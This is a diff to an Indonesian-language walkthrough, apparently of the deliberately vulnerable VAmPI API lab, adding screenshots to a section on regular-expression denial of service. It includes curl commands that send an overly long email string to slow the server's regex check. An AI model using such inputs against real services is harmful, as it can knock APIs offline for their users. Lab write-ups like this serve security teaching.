@@ -5,9 +5,17 @@ Regular expression Denial of Service (ReDoS) adalah serangan Denial of Service, 
 curl http://IP_Server:5000/users/v1/login -d '{"username":"test","password":"test"}' -H 'Content-Type: application/json' --proxy http://127.0.0.1:8080
 ```
 
+![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/regex%20dos/regex%20dos%201.JPG)
+
+![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/regex%20dos/regex%20dos%202.JPG)
+
 - Sekarang kita coba ubah email akun user `name1` dengan inputan string yang sangat panjang misalnya `aaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbb`
 ```sh
 curl -X PUT http://IP_Server:5000/users/v1/name1/email -d '{"email":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbb"}' -H 'Authorization: Bearer token' -H 'Content-Type: application/json' -H "Accept: application/json" --proxy http://127.0.0.1:8080 -v
 ```
+
+![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/regex%20dos/regex%20dos%203.JPG)
+
+![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/regex%20dos/regex%20dos%204.JPG)
 
 - Dari percobaan diatas terlihat bahwa semakin panjang inputan string yang berikan, server akan semakin lama untuk memprosesnya. Hal ini dapat menyebabkan layanan API tidak dapat diakses dalam kurun waktu tertentu
